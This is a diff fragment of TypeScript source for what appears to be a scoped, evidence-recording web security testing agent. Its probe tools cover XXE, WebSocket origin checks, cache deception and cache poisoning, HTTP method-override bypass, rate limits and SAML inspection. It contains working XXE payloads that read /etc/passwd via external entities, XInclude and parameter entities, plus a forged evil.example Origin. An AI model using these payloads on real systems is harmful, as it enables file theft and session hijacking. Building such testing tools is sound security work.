+        const xmlXinclude = `<?xml version="1.0"?><v xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></v>`;
+        const xmlParamEntity = `<?xml version="1.0"?><!DOCTYPE v [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY c '&#x25;a;'>">%b;]><v>&c;</v>`;
+        const send = async (xml: string, kind: "negative_control" | "positive_replay", tag: string) => {
+          const req: HttpRequest = { method: meth, url, headers: { ...authHeaders(s), "content-type": ct }, body: embed(xml) };
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-xxe",
+            kind,
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
+            response: res,
+            note: `xxe ${tag}`,
+          });
+          return { evId: ev.id, status: res.status, body: res.body };
+        };
+        try {
+          const ctrl = await send(xmlCtrl, "negative_control", "control");
+          const canary = await send(xmlCanary, "positive_replay", "entity-canary");
+          const f1 = await send(xmlPasswd, "positive_replay", "file-read /etc/passwd");
+          const f2 = await send(xmlWinini, "positive_replay", "file-read win.ini");
+          const FILE_MARKS = [/root:[x*]:0:0/, /\[fonts\]/i, /\[extensions\]/i, /for 16-bit app support/i];
+          const legHasFile = (b: string) => FILE_MARKS.some((re) => re.test(b));
+          const canaryExpanded = canary.body.includes(tok) && !ctrl.body.includes(tok);
+          const logic = checkLogicEvidence(
+            { status: ctrl.status, hasMarker: legHasFile(ctrl.body) },
+            [f1, f2].map((p) => ({ status: p.status, hasMarker: legHasFile(p.body) })),
+            { requireSuccess: false }, // error pages may still echo the file content inline
+          );
+          if (!logic.ok && canaryExpanded) {
+            // Entities resolve but the classic file legs missed — try XInclude + parameter-entity
+            // error-exfil before giving up; any two legs surfacing file content still confirm.
+            const xi = await send(xmlXinclude, "positive_replay", "xinclude /etc/passwd");
+            const pe = await send(xmlParamEntity, "positive_replay", "param-entity error-exfil");
+            const exfilLegs = [f1, f2, xi, pe].filter((l) => legHasFile(l.body));
+            if (!legHasFile(ctrl.body) && exfilLegs.length >= 2) {
+              const [a, b] = exfilLegs;
+              return txt(
+                JSON.stringify({
+                  category: "xxe",
+                  verdict: "CONFIRMED",
+                  negativeControl: ctrl.evId,
+                  positiveReplays: [a!.evId, b!.evId],
+                  effectMarker: "file content surfaced via alternate exfil legs (XInclude / parameter-entity error channel)",
+                  note: "record_finding(category:'xxe', endpoint, param) — file exfiltration confirmed via non-classic legs; direct entity file-read did not echo.",
+                }),
+              );
+            }
+            return txt(
+              JSON.stringify({
+                verdict: "UNVERIFIED",
+                negativeControl: ctrl.evId,
+                canaryExpanded,
+                exfilLegs: [f1, f2, xi, pe].map((l) => ({ evidenceId: l.evId, hasFile: legHasFile(l.body) })),
+                reason: `entities expand but no exfil leg surfaced file content (${logic.reason}). probe_oob with an external DTD covers the blind case.`,
+                evidenceIds: { control: ctrl.evId, canary: canary.evId, file1: f1.evId, file2: f2.evId, xinclude: xi.evId, paramEntity: pe.evId },
+              }),
+            );
+          }
+          if (logic.ok) {
+            return txt(
+              JSON.stringify({
+                category: "xxe",
+                verdict: "CONFIRMED",
+                negativeControl: ctrl.evId,
+                positiveReplays: [f1.evId, f2.evId],
+                effectMarker: "file content (root:x:0:0 / win.ini sections) inline in entity-XXE responses",
+                note: "record_finding(category:'xxe', endpoint, param) — inline file exfiltration confirmed across two distinct file targets.",
+              }),
+            );
+          }
+          return txt(
+            JSON.stringify({
+              verdict: "UNVERIFIED",
+              negativeControl: ctrl.evId,
+              observation: canaryExpanded ? canary.evId : null,
+              canaryExpanded,
+              reason: canaryExpanded
+                ? "internal entity expanded inline (parser resolves entities) but no file content returned — a suspected XXE lead; try parameter entities / error-based exfil, or probe_oob for a blind case"
+                : `entity canary did not expand — DTDs likely stripped or disabled. ${logic.ok ? "" : `(${logic.reason})`} If the endpoint still parses XML, try probe_oob with an external DTD/parameter-entity payload.`,
+              evidenceIds: { control: ctrl.evId, canary: canary.evId, file1: f1.evId, file2: f2.evId },
+            }),
+          );
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_xxe failed: ${String(e).slice(0, 200)}` }));
+        }
+      },
+    ),
+    tool(
+      "probe_websocket",
+      "Fingerprint a ws:// or wss:// endpoint's AUTH + ORIGIN enforcement via real raw-socket Upgrade handshakes (needed because header control is required for CSWSH). Three legs: (1) LEGIT — your session + the endpoint's own Origin — a 101 proves the socket is reachable at all (a non-101 makes the other legs meaningless → UNVERIFIED); (2) UNAUTH — no Cookie/Bearer: a 101 here means the socket accepts unauthenticated connections (suspected lead — check what data it pushes); (3) EVIL-ORIGIN — your session + Origin: https://evil.example — a 101 here means Origin is NOT validated: CSWSH suspect (a malicious site could ride the victim's session and read the stream). Denials (401/403/login-redirect) mean enforcement — report it, don't force a finding. Every leg is evidence-recorded (the handshake IS the HTTP exchange). Optionally sends ONE benign text frame after connect and reports whether the server pushes frames without auth.",
+      {
+        url: z.string().describe("ws:// or wss:// endpoint, in scope"),
+        message: z.string().optional().describe("one benign text frame to send post-accept (e.g. {\"type\":\"ping\"})"),
+        timeoutMs: z.number().optional().describe("first-frame wait window (default 1200, max 3000)"),
+      },
+      async ({ url, message, timeoutMs }) => {
+        // Scope check against the http(s) equivalent — ws://x/p ↔ http://x/p, wss://x/p ↔ https://x/p.
+        const httpEquiv = url.replace(/^wss:/i, "https:").replace(/^ws:/i, "http:");
+        if (!isInScope(httpEquiv, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        const ownOrigin = (() => { try { const u = new URL(httpEquiv); return u.origin; } catch { return ""; } })();
+        const sessionHeaders = authHeaders(s);
+        const leg = async (headers: Record<string, string>, kind: "negative_control" | "positive_replay", tag: string) => {
+          const r = await wsHandshake({ url, headers, message, timeoutMs });
+          const echoed = Boolean(message && r.firstFrame?.payloadPreview.includes(message));
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-websocket",
+            kind,
+            request: { method: "GET", url: httpEquiv, headers: { ...headers, Upgrade: "websocket" }, body: null },
+            response: { status: r.status, finalUrl: httpEquiv, headers: r.headers, durationMs: 0, truncated: false, bodyBytes: r.responseHead.length + (r.firstFrame?.payloadPreview.length ?? 0), body: `${r.responseHead}${r.firstFrame ? `\n[first frame opcode=${r.firstFrame.opcode}] ${r.firstFrame.payloadPreview}` : ""}${r.error ? `\n[error] ${r.error}` : ""}` },
+            note: `websocket ${tag}${echoed ? " (message echoed)" : ""}`,
+          });
+          return { evId: ev.id, status: r.status, accepted: r.status === 101, firstFrame: r.firstFrame ?? null, echoed, error: r.error };
+        };
+        try {
+          const legit = await leg({ ...sessionHeaders, Origin: ownOrigin }, "negative_control", "legit session+origin");
+          if (!legit.accepted) {
+            return txt(
+              JSON.stringify({
+                verdict: "UNVERIFIED",
+                legit: { status: legit.status, evidenceId: legit.evId, error: legit.error },
+                note: "the endpoint did not accept an upgrade even with a valid session+origin — other legs would be meaningless. Check the URL/scheme and whether the WS path differs from HTTP.",
+              }),
+            );
+          }
+          const unauth = await leg({ Origin: ownOrigin }, "positive_replay", "no session");
+          const evil = await leg({ ...sessionHeaders, Origin: "https://evil.example" }, "positive_replay", "forged Origin + session");
+          const leads: string[] = [];
+          if (unauth.accepted) leads.push("unauthenticated connect ACCEPTED (101) — socket needs no session; verify whether it leaks data or accepts privileged messages");
+          if (evil.accepted) leads.push("forged Origin ACCEPTED (101) — no origin validation → CSWSH suspect: a hostile site can ride a logged-in victim's socket and read/send messages");
+          // Message-level observation: a forged-Origin (or unauth) leg that RECEIVED a server frame
+          // demonstrates actual cross-origin data read — that strengthens the lead but stays suspected.
+          if (evil.accepted && evil.firstFrame) leads.push(`forged-Origin socket RECEIVED a server frame (${JSON.stringify(evil.firstFrame.payloadPreview).slice(0, 80)}) — cross-origin data read demonstrated, not just a handshake anomaly`);
+          if (unauth.accepted && unauth.firstFrame) leads.push(`unauth socket RECEIVED a server frame (${JSON.stringify(unauth.firstFrame.payloadPreview).slice(0, 80)}) — data pushed without a session`);
+          if (evil.accepted && evil.echoed) leads.push("forged-Origin socket ANSWERED our message — bidirectional write+read over a hostile-origin socket (strong CSWSH evidence, still suspected-class)");
+          if (unauth.accepted && unauth.echoed) leads.push("unauth socket ANSWERED our message — the channel accepts and responds to unauthenticated writes");
+          return txt(
+            JSON.stringify({
+              verdict: leads.length ? "LEADS" : "ENFORCED",
+              legit: { status: legit.status, evidenceId: legit.evId, firstFrame: legit.firstFrame },
+              unauth: { status: unauth.status, evidenceId: unauth.evId, accepted: unauth.accepted, firstFrame: unauth.firstFrame, echoed: unauth.echoed },
+              evilOrigin: { status: evil.status, evidenceId: evil.evId, accepted: evil.accepted, firstFrame: evil.firstFrame, echoed: evil.echoed },
+              leads,
+              note: leads.length
+                ? "These are suspected leads — cite the leg evidenceIds (kind observation/positive) in record_finding with verdict:'suspected' + a concrete anomaly; CSWSH confirmation additionally needs demonstrating a sensitive cross-origin read/write."
+                : "Socket enforces session and origin on both legs — nothing to file; that enforcement is worth noting as clean coverage.",
+            }),
+          );
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_websocket failed: ${String(e).slice(0, 200)}` }));
+        }
+      },
+    ),
+    tool(
+      "probe_cache",
+      "Confirm WEB CACHE DECEPTION on an authenticated private page: static-looking suffixes (/page.css, /page/x.css, /%2e%2e;/x.css) can make an edge cache store the private body under a PUBLIC cache key — after our authed request primes it, an UNAUTH fetch of that deception URL may return your private content. Legs: (1) authed baseline (captures a private-content window); (2) unauth on the NORMAL url — should be denied (negative control: unauth ≠ access); (3) authed on deception suffixes until one still serves the private body; (4) unauth on that deception URL ×2 — private body returned → CONFIRMED (cache poisoning of private content). A deception URL that only serves private content while authed is normal, not a finding. Cache headers (Age/X-Cache/CF-Cache-Status) are reported as context — the unauth leak is the proof.",
+      {
+        url: z.string().describe("an authenticated private page URL"),
+        suffixes: z.array(z.string()).optional().describe("deception suffixes to try (default: .css, /decoy.css, /%2e%2e;/decoy.css)"),
+      },
+      async ({ url, suffixes }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        const suffixList = suffixes?.length ? suffixes.slice(0, 4) : [".css", "/decoy.css", "/%2e%2e;/decoy.css"];
+        const base = url.replace(/\/+$/, "");
+        const send = async (u: string, authed: boolean, kind: "negative_control" | "positive_replay", tag: string) => {
+          const req: HttpRequest = authed
+            ? { method: "GET", url: u, headers: authHeaders(s), body: null }
+            : { method: "GET", url: u, headers: {}, body: null, inheritDefaultHeaders: false };
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-cache",
+            kind,
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
+            response: res,
+            note: `cache ${tag}`,
+          });
+          return { evId: ev.id, status: res.status, body: res.body, headers: res.headers, url: u };
+        };
+        try {
+          const baseline = await send(url, true, "negative_control", "authed baseline");
+          if (baseline.body.length < 64) {
+            return txt(JSON.stringify({ verdict: "UNVERIFIED", reason: `baseline body too small (${baseline.body.length}B) to fingerprint`, evidenceId: baseline.evId }));
+          }
+          const mid = baseline.body.slice(Math.floor(baseline.body.length / 2), Math.floor(baseline.body.length / 2) + 64);
+          const overlaps = (b: string) => b.includes(mid);
+          const control = await send(url, false, "negative_control", "unauth normal url");
+          const controlDenied = isAuthRedirect(control) || control.status === 401 || control.status === 403 || isAuthWallBody(control);
+          if (!controlDenied && overlaps(control.body)) {
+            return txt(
+              JSON.stringify({
+                verdict: "PUBLIC-CONTENT",
+                control: control.evId,
+                note: "unauth on the NORMAL url already returns the private body — that's an authz/public-content question, not cache deception. Check probe_authz/accessibility instead.",
+              }),
+            );
+          }
+          // Find a deception suffix that still serves private content while authed.
+          const cacheHdr = (h: Record<string, string>) => Object.fromEntries(Object.entries(h).filter(([k]) => /^(age|x-cache|cf-cache-status|cache-control|x-cache-status|via|cdn-cache|server-timing)$/i.test(k)));
+          let primed: { evId: string; status: number; url: string } | null = null;
+          const tried: Array<{ url: string; status: number; privateWhileAuthed: boolean }> = [];
+          for (const suf of suffixList) {
+            const decUrl = `${base}${suf}`;
+            if (!isInScope(decUrl, s.scope)) continue;
+            const leg = await send(decUrl, true, "positive_replay", `authed deception ${suf}`);
+            const priv = overlaps(leg.body);
+            tried.push({ url: decUrl, status: leg.status, privateWhileAuthed: priv });
+            if (priv && !primed) primed = { evId: leg.evId, status: leg.status, url: decUrl };
+          }
+          if (!primed) {
+            return txt(JSON.stringify({ verdict: "UNVERIFIED", control: control.evId, tried, note: "no deception suffix served the private body while authed — deception can't prime here (normalizer strips suffix or cache varies on path)." }));
+          }
+          // The kill shot — unauth replay of the primed deception URL, twice.
+          const g1 = await send(primed.url, false, "positive_replay", "unauth deception #1");
+          const g2 = await send(primed.url, false, "positive_replay", "unauth deception #2");
+          const logic = checkLogicEvidence(
+            { status: control.status, hasMarker: overlaps(control.body) },
+            [g1, g2].map((p) => ({ status: p.status, hasMarker: overlaps(p.body) })),
+            { requireSuccess: false },
+          );
+          if (logic.ok) {
+            return txt(
+              JSON.stringify({
+                category: "info-disclosure",
+                verdict: "CONFIRMED",
+                negativeControl: control.evId,
+                positiveReplays: [g1.evId, g2.evId],
+                deceptionUrl: primed.url,
+                effectMarker: "private page body (64-char window) returned to an UNAUTHENTICATED request on a static-looking URL",
+                cacheHeaders: cacheHdr(g1.headers),
+                note: "record_finding(category:'info-disclosure', endpoint) — cache stores private content under a public key; also cite the authed-prime leg.",
+              }),
+            );
+          }
+          return txt(
+            JSON.stringify({
+              verdict: "UNVERIFIED",
+              control: control.evId,
+              primed: { url: primed.url, evidenceId: primed.evId },
+              unauthReplays: [g1.evId, g2.evId],
+              reason: logic.ok ? "" : `deception URL serves private body while authed but NOT unauthenticated — ${logic.reason}. Either no shared cache stores it or the key includes the session. ${controlDenied ? "" : "(note: unauth control was not clearly denied)"}`,
+              cacheHeaders: cacheHdr(g1.headers),
+            }),
+          );
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_cache failed: ${String(e).slice(0, 200)}` }));
+        }
+      },
+    ),
+    tool(
+      "probe_method_bypass",
+      "Detect VERB-TUNNELING authorization bypass: an endpoint that denies your role on one HTTP method may ACCEPT another (PUT/PATCH/DELETE/OPTIONS) because the authz check runs per-method or a different handler lacks it. Sends the same request under each method with your session; builds the method×status matrix. When the baseline is DENIED, also tunnels verbs through a POST — X-HTTP-Method-Override / X-Original-Method / X-Method-Override headers and the ?_method= query param — the classic framework tunneling path that skips method-scoped middleware. A method/tunnel that reaches a 2xx content response where another was denied (401/403/login) = suspected bypass LEAD — confirm impact with probe_authz before filing. A uniform matrix = enforcement working.",
+      {
+        url: z.string(),
+        methods: z.array(z.string()).optional().describe("methods to try beyond the baseline (default: POST, PUT, PATCH, DELETE, OPTIONS)"),
+        baselineMethod: z.string().optional().describe("the method the endpoint is documented for (default GET)"),
+        body: z.string().nullable().optional().describe("request body for non-GET methods"),
+      },
+      async ({ url, methods, baselineMethod, body }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        const base = (baselineMethod ?? "GET").toUpperCase();
+        const tries = [...new Set([base, ...(methods ?? ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"])])].slice(0, 7).map((m) => m.toUpperCase());
+        const legs: Array<{ method: string; status: number; evidenceId: string; denied: boolean; bytes: number }> = [];
+        const denied = (res: { status: number; body?: string; headers?: Record<string, string> }) =>
+          res.status === 401 || res.status === 403 || isAuthRedirect(res) || isAuthWallBody(res);
+        try {
+          for (const meth of tries) {
+            const req: HttpRequest = { method: meth, url, headers: authHeaders(s), body: meth === "GET" || meth === "HEAD" ? null : (body ?? null) };
+            const res = await s.http.send(req);
+            bumpHttp(s, res.status);
+            const ev = s.evidence.record({
+              screenId: s.currentScreenId ?? "pilot",
+              validator: "claude-pilot-method",
+              kind: meth === base ? "negative_control" : "positive_replay",
+              request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
+              response: res,
+              note: `method ${meth}`,
+            });
+            legs.push({ method: meth, status: res.status, evidenceId: ev.id, denied: denied(res), bytes: res.body.length });
+          }
+          // Verb-tunneling pass — only when the baseline method was denied: frameworks let a POST
+          // carry the real verb via an override header or _method param, and method-scoped authz
+          // middleware often never sees it.
+          if (legs.find((l) => l.method === base)?.denied) {
+            const tunnels: Array<{ tag: string; send: () => { method: string; url: string; headers: Record<string, string> } }> = [];
+            for (const verb of ["PUT", "DELETE", "PATCH"].filter((v) => v !== base)) {
+              for (const hdr of ["X-HTTP-Method-Override", "X-Original-Method", "X-Method-Override"]) {
+                tunnels.push({ tag: `POST+${hdr}:${verb}`, send: () => ({ method: "POST", url, headers: { ...authHeaders(s), [hdr]: verb } }) });
+              }
+            }
+            tunnels.push({ tag: `POST+_method=PUT`, send: () => ({ method: "POST", url: `${url}${url.includes("?") ? "&" : "?"}_method=PUT`, headers: authHeaders(s) }) });
+            for (const t of tunnels.slice(0, 10)) {
+              const r = t.send();
+              const req: HttpRequest = { method: r.method, url: r.url, headers: r.headers, body: body ?? null };
+              const res = await s.http.send(req);
+              bumpHttp(s, res.status);
+              const ev = s.evidence.record({
+                screenId: s.currentScreenId ?? "pilot",
+                validator: "claude-pilot-method",
+                kind: "positive_replay",
+                request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
+                response: res,
+                note: `method-tunnel ${t.tag}`,
+              });
+              legs.push({ method: t.tag, status: res.status, evidenceId: ev.id, denied: denied(res), bytes: res.body.length });
+            }
+          }
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_method_bypass failed: ${String(e).slice(0, 200)}` }));
+        }
+        const reached = legs.filter((l) => !l.denied && l.status >= 200 && l.status < 400);
+        const blocked = legs.filter((l) => l.denied);
+        const bypass = reached.length > 0 && blocked.length > 0;
+        return txt(
+          JSON.stringify({
+            verdict: bypass ? "SUSPECTED-BYPASS" : "UNIFORM",
+            matrix: legs,
+            reason: bypass
+              ? `${reached.map((l) => l.method).join(",")} reached ${reached[0]!.status} while ${blocked.map((l) => l.method).join(",")} were denied — method-scoped authz. Replays: ${reached.map((l) => l.evidenceId).join(", ")}. Verify the accepted method actually mutates/reads (not just a generic OPTIONS/405 echo) then file via probe_authz or suspected.`
+              : reached.length === legs.length
+                ? "every method reached — either a permissive endpoint or none of these are authz-controlled. Not a bypass signal."
+                : blocked.length === legs.length
+                  ? "every method denied — enforcement holds across verbs."
+                  : "mixed but no denial→accept flip worth chasing.",
+          }),
+        );
+      },
+    ),
+    tool(
+      "probe_cache_poison",
+      "Confirm WEB CACHE POISONING via an unkeyed request header: a cache that keys only on path+query will store a response REFLECTING your injected header value and serve it to anyone fetching the same key. Legs: (1) control — plain GET on a UNIQUE cache-busted URL (?vcb=<tok> so only our own key is primed — never poison a shared key); (2) prime — GET the same URL with a probe header (X-Forwarded-Host / X-Forwarded-Scheme / X-Original-URL / X-Rewrite-URL) carrying a unique marker; if the marker is NOT reflected in that response, the header is keyed or ignored → next header; (3) replay — plain GET on the same URL ×2: marker STILL reflected = the poisoned response was stored under a key reachable without the header → CONFIRMED info-disclosure/cache-poisoning. Marker must be ABSENT in the control. Reflected-only-with-header = keyed correctly, not vulnerable.",
+      {
+        url: z.string(),
+        headers: z.array(z.string()).optional().describe("unkeyed headers to try (default: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, X-Rewrite-URL)"),
+      },
+      async ({ url, headers }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        const tok = `vcp${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
+        const sep = url.includes("?") ? "&" : "?";
+        const keyed = (t: string) => `${url}${sep}vcb=${t}`;
+        const candidates = (headers?.length ? headers : ["X-Forwarded-Host", "X-Forwarded-Scheme", "X-Original-URL", "X-Rewrite-URL"]).slice(0, 6);
+        const send = async (u: string, hdrs: Record<string, string>, kind: "negative_control" | "positive_replay", tag: string) => {
+          const req: HttpRequest = { method: "GET", url: u, headers: { ...authHeaders(s), ...hdrs }, body: null };
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-cachepoison",
+            kind,
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
+            response: res,
+            note: `cachepoison ${tag}`,
+          });
+          return { evId: ev.id, status: res.status, body: res.body };
+        };
+        const tried: Array<{ header: string; reflected: boolean }> = [];
+        try {
+          for (const h of candidates) {
+            const key = keyed(`${tok}-${h.replace(/[^a-z]/gi, "").toLowerCase()}`);
+            const marker = `${tok}.${h.replace(/[^a-z]/gi, "").toLowerCase()}.example`;
+            const control = await send(key, {}, "negative_control", `control ${h}`);
+            if (control.body.includes(marker)) continue; // impossible, but never claim on tainted control
+            const prime = await send(key, { [h]: marker }, "positive_replay", `prime ${h}`);
+            const reflected = prime.body.includes(marker);
+            tried.push({ header: h, reflected });
+            if (!reflected) continue;
+            const r1 = await send(key, {}, "positive_replay", `replay ${h} #1`);
+            const r2 = await send(key, {}, "positive_replay", `replay ${h} #2`);
+            const logic = checkLogicEvidence(
+              { status: control.status, hasMarker: control.body.includes(marker) },
+              [r1, r2].map((p) => ({ status: p.status, hasMarker: p.body.includes(marker) })),
+              { requireSuccess: true },
+            );
+            if (logic.ok) {
+              return txt(
+                JSON.stringify({
+                  category: "info-disclosure",
+                  verdict: "CONFIRMED",
+                  negativeControl: control.evId,
+                  positiveReplays: [r1.evId, r2.evId],
+                  poisonedHeader: h,
+                  poisonedUrl: key,
+                  effectMarker: `injected ${h}: ${marker} reflected in response and REPLAYED on plain GETs — stored under a shared cache key`,
+                  note: `record_finding(category:'info-disclosure', endpoint) — ${h} is unkeyed and reflected; anyone fetching ${key} (or the real URL if the param isn't keyed) gets the poisoned body. Prime leg evidence: ${prime.evId}.`,
+                }),
+              );
+            }
+            // Reflected during prime but not served back plain — keyed correctly, keep trying.
+          }
+          return txt(
+            JSON.stringify({
+              verdict: "UNVERIFIED",
+              tried,
+              reason: tried.some((t) => t.reflected)
+                ? "header(s) reflected during prime but the plain replay did NOT serve the poisoned body — the cache keys on the header (or no shared cache). Correctly keyed."
+                : "no candidate header reflected into the response — nothing injectable to poison with on this endpoint.",
+            }),
+          );
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_cache_poison failed: ${String(e).slice(0, 200)}` }));
+        }
+      },
+    ),
+    tool(
+      "probe_rate_limit",
+      "Measure whether a sensitive endpoint enforces RATE LIMITING: sends a bounded burst of identical requests and counts outcomes. ENFORCEMENT = 429 / 423 / Retry-After / CAPTCHA / lockout-403 appearing mid-burst → report it as coverage, not a finding. ALL-2xx through the burst on an auth-sensitive endpoint (login/reset/verify/send-code/otp/recover) = a suspected missing-rate-limit LEAD → record_finding(rate-limit, suspected). Default 12 GETs; pass method/body for POST targets (login forms — test creds only). Not for heavy endpoints — keep count ≤ 30.",
+      {
+        url: z.string(),
+        method: z.string().optional().describe("default GET"),
+        body: z.string().nullable().optional(),
+        count: z.number().optional().describe("burst size 8–30 (default 12)"),
+        delayMs: z.number().optional().describe("gap between sends, default 0 (burst)"),
+      },
+      async ({ url, method, body, count, delayMs }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        const meth = (method ?? "GET").toUpperCase();
+        const n = Math.max(8, Math.min(30, count ?? 12));
+        const gap = Math.max(0, delayMs ?? 0);
+        const statuses: number[] = [];
+        const evIds: string[] = [];
+        let enforcedAt = -1;
+        const ENFORCED_RE = /captcha|too many requests|rate.?limit|try again later|temporarily blocked|locked/i;
+        try {
+          for (let i = 0; i < n; i++) {
+            const req: HttpRequest = { method: meth, url, headers: authHeaders(s), body: meth === "GET" || meth === "HEAD" ? null : (body ?? null) };
+            const res = await s.http.send(req);
+            bumpHttp(s, res.status);
+            statuses.push(res.status);
+            if (enforcedAt < 0 && (res.status === 429 || res.status === 423 || res.headers["retry-after"] || res.headers["Retry-After"] || ENFORCED_RE.test(res.body))) enforcedAt = i;
+            if (i === 0 || i === n - 1 || enforcedAt === i) {
+              const ev = s.evidence.record({
+                screenId: s.currentScreenId ?? "pilot",
+                validator: "claude-pilot-ratelimit",
+                kind: enforcedAt === i && i > 0 ? "positive_replay" : "negative_control",
+                request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
+                response: res,
+                note: `rate-limit burst ${i + 1}/${n}`,
+              });
+              evIds.push(ev.id);
+            }
+            if (gap > 0 && i < n - 1) await new Promise((r) => setTimeout(r, gap));
+          }
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_rate_limit failed at send ${statuses.length + 1}: ${String(e).slice(0, 160)}`, statuses }));
+        }
+        const allOk = statuses.every((st) => st < 400);
+        const enforced = enforcedAt >= 0;
+        const sensitive = /login|signin|auth|reset|verify|code|otp|token|password|recover|forgot|send/i.test(url);
+        return txt(
+          JSON.stringify({
+            verdict: enforced ? "ENFORCED" : allOk && sensitive ? "UNBOUNDED-LEAD" : "INCONCLUSIVE",
+            count: statuses.length,
+            statuses,
+            enforcedAt,
+            evidenceIds: evIds,
+            note: enforced
+              ? `throttle signal at send ${enforcedAt + 1} — enforcement exists; report as coverage.`
+              : allOk && sensitive
+                ? `${statuses.length} sends all returned <400 on an auth-sensitive endpoint with no throttle signal — suspected missing rate-limit. record_finding(rate-limit, suspected) citing ${evIds.join(", ")}; note brute-force cost depends on credential space.`
+                : allOk
+                  ? "no throttle, but the endpoint isn't auth-sensitive — rate-limiting may be intentionally absent. Not a lead."
+                  : `mixed statuses (${[...new Set(statuses)].join(",")}) without a clear throttle signal — inconclusive.`,
+          }),
+        );
+      },
+    ),
+    tool(
+      "analyze_saml",
+      "PASSIVELY audit a SAML response/assertion (no replay): fetches a page and pulls the SAMLResponse form field, or takes raw base64. Decodes the XML and reports: assertion+response signatures present?, encryption present?, signature/digest algorithms (RSA-SHA1/MD5 = weak), Issuer/Audience/Conditions/NotBefore/NotOnOrAfter, and misconfig LEADS — unsigned assertion, missing conditions/audience, weak algs, encrypted-only-without-signature. Leads are suspected-class; a forged-response ACCEPTANCE test needs a signed-replay oracle this tool deliberately does not do (state that in the finding). Use on a response you captured via login or an SSO POST.",
+      {
+        url: z.string().optional().describe("page to fetch and scan for a SAMLResponse field"),
+        samlResponse: z.string().optional().describe("raw base64 SAMLResponse (from an intercepted POST)"),
+      },
+      async ({ url, samlResponse }) => {
+        let b64 = samlResponse?.trim() ?? "";
+        let source = "provided";
+        let evId: string | null = null;
+        if (!b64) {
+          if (!url || !isInScope(url, s.scope)) return txt(`BLOCKED: need samlResponse or an in-scope url`);
+          const res = await s.http.send({ method: "GET", url, headers: authHeaders(s), body: null });
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-saml",
+            kind: "positive_replay",
+            request: { method: "GET", url, headers: s.http.effectiveHeaders(authHeaders(s)), body: null },
+            response: res,
+            note: "saml source page",
+          });
+          evId = ev.id;
+          source = url;
+          const m = /name=["']SAMLResponse["'][^>]*value=["']([^"']+)["']/i.exec(res.body) ?? /value=["']([^"']+)["'][^>]*name=["']SAMLResponse["']/i.exec(res.body);
+          if (!m?.[1]) return txt(JSON.stringify({ error: "no SAMLResponse field found in the fetched page", evidenceId: evId }));
+          b64 = m[1];
+        }
+        let xml: string;
+        try {
+          xml = Buffer.from(b64.replace(/\s/g, ""), "base64").toString("utf8");
+          if (!/<saml|<samlp|<Response|Assertion/.test(xml)) throw new Error("not SAML XML");
+        } catch {
+          return txt(JSON.stringify({ error: "SAMLResponse did not base64-decode to SAML XML" }));
+        }
+        const has = (re: RegExp) => re.test(xml);
+        const grab = (re: RegExp) => re.exec(xml)?.[1] ?? null;
+        const signed = { response: has(/<ds:Signature[\s>]|<Signature[\s>][\s\S]*?<\/Signature>/), assertion: has(/<saml:Assertion[\s\S]*?<ds:Signature/) };
+        const encrypted = has(/<saml:EncryptedAssertion|<EncryptedData/);
+        const sigAlg = grab(/SignatureMethod[^>]*Algorithm="([^"]+)"/);
+        const digestAlg = grab(/DigestMethod[^>]*Algorithm="([^"]+)"/);
+        const issuer = grab(/<saml:Issuer[^>]*>([^<]+)</);
+        const audience = grab(/<saml:Audience[^>]*>([^<]+)</);
+        const conditions = has(/<saml:Conditions/);
+        const notBefore = grab(/NotBefore="([^"]+)"/);
+        const notOnOrAfter = grab(/NotOnOrAfter="([^"]+)"/);
+        const leads: string[] = [];
+        if (!signed.assertion && !signed.response) leads.push("NO signature on assertion or response — an unsigned assertion would be trivially forgeable if accepted; verify whether the IdP actually signs at another layer");
+        if (!signed.assertion && signed.response) leads.push("assertion itself unsigned (only the response envelope is) — XML-signature-wrapping / assertion-substitution class is possible");
+        if (sigAlg && /rsa-sha1|md5|sha1/i.test(sigAlg)) leads.push(`weak signature algorithm ${sigAlg} — SHA-1 signatures are downgrade-prone`);
+        if (digestAlg && /md5|sha1/i.test(digestAlg)) leads.push(`weak digest ${digestAlg}`);
+        if (!conditions) leads.push("no <saml:Conditions> — no audience/validity window; assertion is replayable across services");
+        if (!audience) leads.push("no AudienceRestriction — assertion may be replayable cross-SP");
+        if (!notOnOrAfter) leads.push("no NotOnOrAfter — assertion never expires (replay window unbounded)");
